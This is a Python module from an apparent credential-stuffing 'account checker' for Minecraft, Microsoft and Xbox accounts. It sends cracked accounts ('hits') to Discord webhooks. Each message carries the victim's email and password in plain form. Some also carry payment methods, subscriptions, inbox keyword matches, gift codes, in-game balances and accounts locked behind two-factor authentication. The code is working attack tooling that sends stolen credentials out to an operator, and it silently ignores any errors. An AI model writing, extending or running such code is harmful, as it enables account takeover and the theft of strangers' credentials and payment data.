"""
discord_notifier.py — Discord webhook notifications (embed + plain-text).
Extracted from meow.py / DonutSMP Checker.py webhook logic.
"""
import json
import datetime
import requests

_AVATAR_URL = 'https://mc-heads.net/avatar/{name}'
_CRAFATAR_URL = 'https://crafatar.com/renders/body/{uuid}?overlay'
_FOOTER_TEXT = 'Ultimate MC Checker v2.0'


def _post_webhook(url: str, payload: dict) -> None:
    """POST payload to webhook URL, silently ignoring all errors."""
    try:
        if not url or not url.startswith('http'):
            return
        requests.post(
            url,
            data=json.dumps(payload),
            headers={'Content-Type': 'application/json'},
            timeout=5,
        )
    except Exception:
        pass


def _capture_to_fields(capture_obj) -> list:
    """Convert a CaptureObject to a list of Discord embed field dicts."""
    field_map = [
        ('Email:Password', f'||{capture_obj.email}:{capture_obj.password}||'),
        ('Name', capture_obj.name),
        ('Account Type', capture_obj.type),
        ('Capes', capture_obj.capes),
        ('Hypixel', capture_obj.hypixl),
        ('Hypixel Level', capture_obj.level),
        ('First Login', capture_obj.firstlogin),
        ('Last Login', capture_obj.lastlogin),
        ('Bedwars Stars', capture_obj.bwstars),
        ('Skywars Stars', capture_obj.swstars),
        ('Skyblock Coins', capture_obj.sbcoins),
        ('Skyblock Networth', capture_obj.sbnetworth),
        ('Pit Gold', capture_obj.pitcoins),
        ('Skyblock Level', capture_obj.sb_lvl),
        ('Skyblock Items', capture_obj.sb_items),
        ('Optifine Cape', capture_obj.cape),
        ('Email Access', capture_obj.access),
        ('Name Change', capture_obj.namechanged),
        ('Last Name Change', capture_obj.lastchanged),
        ('Banned', capture_obj.banned),
        ('MS Balance', capture_obj.ms_balance),
        ('Rewards Points', capture_obj.ms_rewards),
        ('DonutSMP Money', capture_obj.donut_money),
        ('DonutSMP Kills', capture_obj.donut_kills),
        ('DonutSMP Deaths', capture_obj.donut_deaths),
        ('DonutSMP Playtime', capture_obj.donut_playtime),
        ('DonutSMP Shards', capture_obj.donut_shards),
    ]
    fields = []
    for name, value in field_map:
        if value and str(value) not in ('None', 'N/A', ''):
            fields.append({
                'name': name,
                'value': str(value)[:1024],
                'inline': True,
            })

    # Payment methods
    if hasattr(capture_obj, 'ms_payment_methods') and capture_obj.ms_payment_methods:
        fields.append({
            'name': 'Payment Methods',
            'value': '\n'.join(str(p) for p in capture_obj.ms_payment_methods)[:1024],
            'inline': False,
        })

    # Subscriptions
    if hasattr(capture_obj, 'ms_subscriptions') and capture_obj.ms_subscriptions:
        fields.append({
            'name': 'Subscriptions',
            'value': '\n'.join(str(s) for s in capture_obj.ms_subscriptions)[:1024],
            'inline': False,
        })

    # Inbox matches
    if hasattr(capture_obj, 'inbox_matches') and capture_obj.inbox_matches:
        inbox_str = ', '.join(f'{k}({v})' for k, v in capture_obj.inbox_matches)
        fields.append({'name': 'Inbox Matches', 'value': inbox_str[:1024], 'inline': False})

    # Buddy pass codes
    if hasattr(capture_obj, 'buddy_codes') and capture_obj.buddy_codes:
        fields.append({
            'name': 'Buddy Pass Codes',
            'value': '\n'.join(capture_obj.buddy_codes)[:1024],
            'inline': False,
        })

    return fields[:25]  # Discord limit


_TYPE_COLORS = {
    'Hypixel': 0xFFA500,
    'XboxGamePass': 0x107C10,
    'XboxGamePassUltimate': 0x9B4DCA,
    'Normal': 0x57F287,
}

def _get_color(account_type: str) -> int:
    return _TYPE_COLORS.get(account_type, 0x57F287)

def _build_embed(title: str, color: int, fields: list, name: str, uuid: str = None) -> dict:
    avatar = _AVATAR_URL.format(name=name) if name and name != 'N/A' else None
    embed = {
        'title': title,
        'color': color,
        'fields': fields,
        'footer': {'text': _FOOTER_TEXT, 'icon_url': 'https://mc-heads.net/avatar/MHF_Steve'},
        'timestamp': datetime.datetime.utcnow().isoformat(),
    }
    if avatar:
        embed['thumbnail'] = {'url': avatar}
    if uuid:
        embed['image'] = {'url': _CRAFATAR_URL.format(uuid=uuid)}
    return embed


def send_hit_webhook(capture_obj, config: dict) -> None:
    url = config.get('discord_webhook_hits', '')
    if not url:
        return

    name = getattr(capture_obj, 'name', 'N/A') or 'N/A'
    acct_type = getattr(capture_obj, 'type', 'N/A') or 'N/A'
    uuid = getattr(capture_obj, 'uuid', '') or ''
    color = _get_color(acct_type)

    if config.get('discord_embed_mode', True):
        fields = _capture_to_fields(capture_obj)
        embed = _build_embed(f'🎯 Hit Found — {name}', color, fields, name, uuid)
        embed['description'] = f'**{acct_type}** account captured'
        payload = {
            'username': 'Ultimate MC Checker',
            'avatar_url': _AVATAR_URL.format(name=name) if name != 'N/A' else None,
            'embeds': [embed],
        }
    else:
        lines = [
            f'🎯 **HIT FOUND**',
            f'```',
            f'Email: {capture_obj.email}',
            f'Password: {capture_obj.password}',
            f'Name: {name}',
            f'Type: {acct_type}',
            f'```',
        ]
        payload = {'username': 'Ultimate MC Checker', 'content': '\n'.join(lines)}

    _post_webhook(url, payload)


def send_2fa_webhook(email: str, password: str, config: dict) -> None:
    url = config.get('discord_webhook_2fa', '')
    if not url:
        return

    if config.get('discord_embed_mode', True):
        payload = {
            'username': 'Ultimate MC Checker',
            'embeds': [{
                'title': '🔐 2FA Account Found',
                'color': 0xFF00FF,
                'description': 'Account requires two-factor authentication',
                'fields': [
                    {'name': 'Email', 'value': f'||`{email}`||', 'inline': True},
                    {'name': 'Password', 'value': f'||`{password}`||', 'inline': True},
                ],
                'footer': {'text': _FOOTER_TEXT, 'icon_url': 'https://mc-heads.net/avatar/MHF_Steve'},
                'timestamp': datetime.datetime.utcnow().isoformat(),
            }],
        }
    else:
        payload = {
            'username': 'Ultimate MC Checker',
            'content': f'🔐 **2FA Account**\n```\nEmail: {email}\nPassword: {password}\n```',
        }

    _post_webhook(url, payload)


def send_xbox_webhook(email: str, password: str, account_type: str, config: dict) -> None:
    url = config.get('discord_webhook_xbox', '')
    if not url:
        return

    color = _get_color(account_type or '')
    if config.get('discord_embed_mode', True):
        payload = {
            'username': 'Ultimate MC Checker',
            'embeds': [{
                'title': f'🎮 Xbox Account — {account_type or "N/A"}',
                'color': color,
                'description': f'**{account_type}** subscription detected',
                'fields': [
                    {'name': 'Email', 'value': f'||`{email}`||', 'inline': True},
                    {'name': 'Password', 'value': f'||`{password}`||', 'inline': True},
                    {'name': 'Type', 'value': account_type or 'N/A', 'inline': False},
                ],
                'footer': {'text': _FOOTER_TEXT, 'icon_url': 'https://mc-heads.net/avatar/MHF_Steve'},
                'timestamp': datetime.datetime.utcnow().isoformat(),
            }],
        }
    else:
        payload = {
            'username': 'Ultimate MC Checker',
            'content': f'🎮 **Xbox Account**\n```\nEmail: {email}\nPassword: {password}\nType: {account_type}\n```',
        }

    _post_webhook(url, payload)


def send_other_webhook(email: str, password: str, items: str, config: dict) -> None:
    url = config.get('discord_webhook_other', '')
    if not url:
        return

    if config.get('discord_embed_mode', True):
        payload = {
            'username': 'Ultimate MC Checker',
            'embeds': [{
                'title': '📦 Other Account Found',
                'color': 0xFFFF00,
                'description': 'Account with additional entitlements',
                'fields': [
                    {'name': 'Email', 'value': f'||`{email}`||', 'inline': True},
                    {'name': 'Password', 'value': f'||`{password}`||', 'inline': True},
                    {'name': 'Items', 'value': items or 'N/A', 'inline': False},
                ],
                'footer': {'text': _FOOTER_TEXT, 'icon_url': 'https://mc-heads.net/avatar/MHF_Steve'},
                'timestamp': datetime.datetime.utcnow().isoformat(),
            }],
        }
    else:
        payload = {
            'username': 'Ultimate MC Checker',
            'content': f'📦 **Other Account**\n```\nEmail: {email}\nPassword: {password}\nItems: {items}\n```',
        }

    _post_webhook(url, payload)
